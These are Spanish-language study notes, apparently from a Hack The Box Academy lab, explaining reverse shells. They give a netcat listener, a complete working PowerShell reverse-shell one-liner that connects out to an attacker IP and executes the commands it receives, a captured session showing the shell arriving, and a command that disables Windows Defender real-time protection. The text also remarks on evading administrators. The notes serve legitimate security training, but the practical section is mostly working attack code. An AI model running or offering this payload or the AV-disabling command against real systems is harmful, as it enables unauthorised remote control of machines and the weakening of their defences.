En un `reverse shell`, el `HACKER` tendrá un oyente ejecutándose y `LA VICTIMA` deberá iniciar la conexión.
![Reverse|700x400](https://academy.hackthebox.com/storage/modules/115/reverseshell.png)

A menudo usamos este tipo de shell cuando nos encontramos con sistemas vulnerables porque es probable que un administrador pase por alto las conexiones salientes, lo que nos brinda una mayor probabilidad de pasar desapercibidos.

> [!NOTE]
> No siempre necesitamos reinventar la rueda cuando se trata de cargas útiles (comandos y código) que pretendemos usar al intentar establecer un caparazón inverso con un objetivo. Existen herramientas útiles que los veteranos de la seguridad de la información han creado para ayudarnos. [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) es un recurso fantástico que contiene una lista de diferentes comandos, códigos e incluso generadores automatizados de shell inverso que podemos usar cuando practicamos o en un compromiso real. Debemos tener en cuenta que muchos administradores conocen los repositorios públicos y los recursos de código abierto que suelen utilizar los evaluadores de penetración. Pueden hacer referencia a estos repositorios como parte de sus consideraciones principales sobre qué esperar de un ataque y ajustar sus controles de seguridad en consecuencia. En algunos casos, es posible que necesitemos personalizar un poco nuestros ataques.

## Práctica con un reverse shell simple en Windows
#### Servidor ( `attack box`)
```js
p314d0@htb[/htb]$ sudo nc -lvnp 443
```
#### Cliente (objetivo)
```cmd
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.15.13',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```js
┌──(pelado㉿kali)-[~/HTB/Academy/ShellsPayloads]
└─$ sudo nc -lvnp 443                          
[sudo] password for pelado: 
listening on [any] 443 ...
connect to [10.10.15.13] from (UNKNOWN) [10.129.201.51] 49874
whoami
shells-win10\htb-student
PS C:\Users\htb-student> 
```

A veces, el `Windows Defender antivirus` ( `AV`) el software detuvo la ejecución del código. Esto está funcionando exactamente como estaba previsto y desde un punto de vista `defensivo` , este es un `win`. Desde un punto de vista ofensivo, existen algunos obstáculos que superar si AV está habilitado en un sistema al que intentamos conectarnos. Para nuestros propósitos, querremos desactivar el antivirus a través del `Virus & threat protection settings` o usando este comando en una consola administrativa de PowerShell (haga clic derecho, ejecute como administrador):
#### Desactivar AV
```powershell
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```

